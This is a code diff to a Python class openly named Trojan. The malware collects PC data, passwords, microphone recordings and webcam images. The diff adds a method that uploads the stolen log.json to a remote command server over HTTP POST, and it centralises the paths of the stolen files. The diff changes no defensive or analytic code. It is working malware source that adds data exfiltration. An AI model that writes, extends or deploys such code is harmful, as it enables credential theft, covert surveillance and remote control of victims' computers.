@@ -99,6 +99,12 @@ class Trojan:
         # Information (PC Data, Passwords and all other).
         self.__stealed_information = {}
 
+        # Paths to files.
+        self.__files_paths = {
+            "stealed_information": self.__setting_cache_folder + "\\Data\\log.json",
+            "stealed_microphone": self.__setting_cache_folder + "\\Audio\\recording.wav",
+            "stealed_webcam": self.__setting_cache_folder + "\\Image\\Image.png",
+        }
         # Running trojan.
         self.run()
 
@@ -291,6 +297,34 @@ class Trojan:
         # Showing debug message.
         self.show_debug_message("Stealed all information from client!")
 
+        if self.__setting_send_stealed_information_to_server:
+            # If sending is enabled.
+
+            # Sending information.
+            self.stealer_send_information()
+
+    def stealer_send_information(self) -> None:
+        """
+        Sends collected information to an server.
+        :return: [None] Not returns any.
+        """
+
+        # Checking server UP.
+        self.check_server_urls()
+
+        # Sending.
+        with open(self.__files_paths["stealed_information"], 'rb') as file:
+            # With opened file.
+
+            # Making an request.
+            request = requests.post(self.__server_url + self.__server_script_stealed_information_file,
+                                    files={'log.json': file},
+                                    params={
+                                        "sync_uri": self.__server_unique_request_index
+                                    }
+                                    )
+        self.show_debug_message("Sent information on the server!")
+
     def stealer_create_log(self) -> None:
         """
         Creates log of the stealer, by creating an file in cache directory.
@@ -444,7 +478,7 @@ class Trojan:
             ret_val, img = cam.read()
 
             # Getting filename.
-            filename = self.__setting_cache_folder + "\\Image\\Image.png"
+            filename = self.__files_paths["stealed_webcam"]
 
             # Validating path.
             self.path_validate(filename)
@@ -491,7 +525,7 @@ class Trojan:
         # Getting response from a server (Synchronisation script).
         try:
             # Getting an response.
-            response = requests.get(
+            response = requests.post(
                 self.__server_url + self.__server_script_remote_access_file,
                 params={
                     "sync_method": "server-client",
@@ -565,7 +599,7 @@ class Trojan:
         self.show_debug_message("Finished recording microphone.")
 
         # File name.
-        filename = self.__setting_cache_folder + "\\Audio\\recording.wav"
+        filename = self.__files_paths["stealed_microphone"]
 
         # Validating filename.
         self.path_validate(filename)
